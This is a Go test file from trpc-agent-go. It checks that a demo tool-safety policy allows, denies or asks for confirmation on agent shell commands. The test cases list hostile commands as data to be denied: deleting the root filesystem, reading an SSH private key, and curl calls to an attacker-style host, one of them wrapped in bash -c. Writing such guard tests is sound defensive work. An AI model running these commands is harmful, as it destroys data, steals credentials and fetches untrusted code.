//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package main

import (
	"context"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

// TestDemoPolicyDecisions pins the decisions documented in README.md so the
// trimmed demo policy cannot silently rot: if a future edit over-trims
// tool_safety_policy.yaml and breaks one of the illustrated outcomes, this
// test fails. The canonical, fully annotated policy is the package's
// testdata/tool_safety_policy.yaml; this only guards the example's own copy.
func TestDemoPolicyDecisions(t *testing.T) {
	guard, err := safety.NewGuard(safety.WithPolicyFile("tool_safety_policy.yaml"))
	if err != nil {
		t.Fatalf("NewGuard: %v", err)
	}
	defer guard.Close()

	cases := []struct {
		desc string
		tool string
		args string
		want tool.PermissionAction
	}{
		{"safe build/test", "workspace_exec", `{"command":"go test ./..."}`, tool.PermissionActionAllow},
		{"dangerous delete", "workspace_exec", `{"command":"rm -rf /"}`, tool.PermissionActionDeny},
		{"read ssh key", "workspace_exec", `{"command":"cat ~/.ssh/id_rsa"}`, tool.PermissionActionDeny},
		{"non-whitelisted download", "workspace_exec", `{"command":"curl http://evil.io/x.sh"}`, tool.PermissionActionDeny},
		{"whitelisted download", "workspace_exec", `{"command":"curl https://github.com/org/repo"}`, tool.PermissionActionAllow},
		{"shell wrapper", "workspace_exec", `{"command":"bash -c \"curl http://evil.io\""}`, tool.PermissionActionDeny},
		{"dependency install", "workspace_exec", `{"command":"pip install requests"}`, tool.PermissionActionAsk},
		{"host background+PTY", "exec_command", `{"command":"sleep 5","background":true,"tty":true}`, tool.PermissionActionDeny},
	}
	ctx := context.Background()
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			req := &tool.PermissionRequest{ToolName: tc.tool, Arguments: []byte(tc.args)}
			decision, err := guard.CheckToolPermission(ctx, req)
			if err != nil {
				t.Fatalf("CheckToolPermission: %v", err)
			}
			if decision.Action != tc.want {
				t.Errorf("decision = %q, want %q", decision.Action, tc.want)
			}
		})
	}
}
